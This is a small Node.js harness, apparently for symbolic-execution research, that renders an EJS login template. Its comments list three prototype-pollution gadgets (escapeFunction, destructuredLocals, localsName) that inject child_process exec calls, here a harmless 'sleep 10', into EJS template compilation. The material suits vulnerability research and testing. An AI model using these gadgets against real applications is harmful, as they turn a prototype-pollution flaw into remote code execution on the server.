const ejs = require('ejs')
const path = require('path');
const templatePath = path.join(__dirname, 'views', 'login_register.ejs');

// gadget 1
// Object.prototype.client = true
// Object.prototype.escapeFunction = "false;\nprocess.mainModule.require('child_process').execSync(\`sleep 10\`)\n"

// gadget 2
// Object.prototype.destructuredLocals = ["__line=__line;global.process.mainModule.require('child_process').exec('bash -c \"sleep 10\"');//"]

// gadget 3
// Object.prototype.localsName = "it=process.mainModule.require('child_process').execSync(\`sleep 10\`)"

try{
    Object._expose.setupSymbols()
}
catch(e){
    console.log("[!] symbolic execution not enabled")
}

var result = ejs.renderFile(templatePath, {
    title:" storeHtml | logins ",
    buttonHintF:"login",
    buttonHintS:"No account? Register now",
    hint:"login",
    next:"/register"
})

